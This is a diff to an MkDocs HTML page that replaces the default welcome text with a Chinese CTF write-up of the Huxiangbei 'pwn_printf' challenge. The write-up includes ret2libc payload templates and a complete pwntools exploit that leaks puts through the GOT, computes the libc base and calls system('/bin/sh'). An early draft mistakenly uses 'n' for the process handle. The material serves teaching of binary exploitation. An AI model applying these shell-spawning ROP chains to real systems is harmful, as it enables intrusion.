@@ -14,7 +14,7 @@
     
     
       
-        <title>MkDocs - Trick</title>
+        <title>湖湘杯hxb_pwn - Trick</title>
       
     
     
@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#welcome-to-mkdocs" class="md-skip">
+        <a href="#hxb_pwn" class="md-skip">
           跳转至
         </a>
       
@@ -91,7 +91,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              MkDocs
+              湖湘杯hxb_pwn
             
           </span>
         </div>
@@ -371,56 +371,11 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        MkDocs
-        <span class="md-nav__icon md-icon"></span>
-      </label>
-    
-    <a href="./" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../aboutMkdocs/" class="md-nav__link">
       MkDocs
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    Commands
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#project-layout" class="md-nav__link">
-    Project layout
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
     
@@ -448,16 +403,22 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    Commands
+  <a href="#pwn_printf" class="md-nav__link">
+    pwn_printf
+  </a>
+  
+    <nav class="md-nav" aria-label="pwn_printf">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pwn_libc" class="md-nav__link">
+    pwn_libc
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#project-layout" class="md-nav__link">
-    Project layout
-  </a>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -474,20 +435,76 @@
               
                 
                 
-                <h1 id="welcome-to-mkdocs">Welcome to MkDocs</h1>
-<p>For full documentation visit <a href="http://mkdocs.org">mkdocs.org</a>.</p>
-<h2 id="commands">Commands</h2>
-<ul>
-<li><code>mkdocs new [dir-name]</code> - Create a new project.</li>
-<li><code>mkdocs serve</code> - Start the live-reloading docs server.</li>
-<li><code>mkdocs build</code> - Build the documentation site.</li>
-<li><code>mkdocs help</code> - Print this help message.</li>
-</ul>
-<h2 id="project-layout">Project layout</h2>
-<pre><code>mkdocs.yml    # The configuration file.
-docs/
-    index.md  # The documentation homepage.
-    ...       # Other markdown pages, images and other files.
+                <h1 id="hxb_pwn">湖湘杯hxb_pwn</h1>
+<h2 id="pwn_printf">pwn_printf</h2>
+<h3 id="pwn_libc">pwn_libc</h3>
+<p>ida</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>16次循环
+下面if判断v12&lt;=0x20
+所以写</p>
+<pre><code class="language-python">for i in range(16):
+    n.sendline(&quot;32&quot;)
+</code></pre>
+<p>跟进if下面的函数</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" /></p>
+<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。
+再然后a * a1，所以传参需要double 0x20，也就是0x40
+<code>ROPgadget --binary pwn_printf</code>
+找到pop_rdi_ret的地址
+复习一下libc64_payload公式</p>
+<pre><code class="language-python">64位payload: payload = &quot;a&quot;*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)
+</code></pre>
+<p>写exp：</p>
+<pre><code class="language-python">from pwn import *
+sh = process('./pwn_printf')
+elf = ELF('./pwn_printf')
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+pop_rdi = 0x401213
+for i in range(16):
+    n.sendline(&quot;32&quot;)
+payload = 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(0x4007C6)
+sh.send(payload)
+sh.recvuntil('You will find this game very interesting\n')
+puts_addr = u64(sh.recvn(6).ljust(8, '\x00'))
+print(hex(puts_addr))
+</code></pre>
+<p>这就print出来了puts的地址</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" /></p>
+<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
+<p>在套用一下公式</p>
+<pre><code class="language-python">libc_base = puts_addr - 0x080a30    # -libc_Offset的puts
+
+system_addr = libc_base + 0x04f4e0   # +libc_Offset的system
+
+bin_sh_addr = libc_base + 0x1b40fa      # +libc_Offset的bin/sh
+</code></pre>
+<p>复习一下libc64_getshell公式</p>
+<pre><code class="language-python">getshell: &quot;a&quot;*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)
+</code></pre>
+<p>完整exp：</p>
+<pre><code class="language-python">from pwn import *
+sh = process('./pwn_printf')
+elf = ELF('./pwn_printf')
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+pop_rdi = 0x401213
+for i in range(16):
+    sh.sendline(&quot;32&quot;)
+payload = 'a' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(0x4007C6)
+sh.send(payload)
+sh.recvuntil('You will find this game very interesting\n')
+puts_addr = u64(sh.recvn(6).ljust(8, '\x00'))
+print(hex(puts_addr))
+libc_base = puts_addr - 0x080a30 #0x6f6a0
+system_addr = libc_base + 0x04f4e0 #0x0453a0
+bin_sh_addr = libc_base + 0x1b40fa #0x18ce17 
+payload = 'a' * 8 + p64(0x4007C6) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
+
+sh.send(payload)
+
+sh.interactive()
 </code></pre>
                 
               
@@ -503,27 +520,6 @@ docs/
       
         
 <footer class="md-footer">
-  
-    <div class="md-footer-nav">
-      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
-        
-          <a href="../friend/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-            </div>
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  上一页
-                </span>
-                友情链接
-              </div>
-            </div>
-          </a>
-        
-        
-      </nav>
-    </div>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
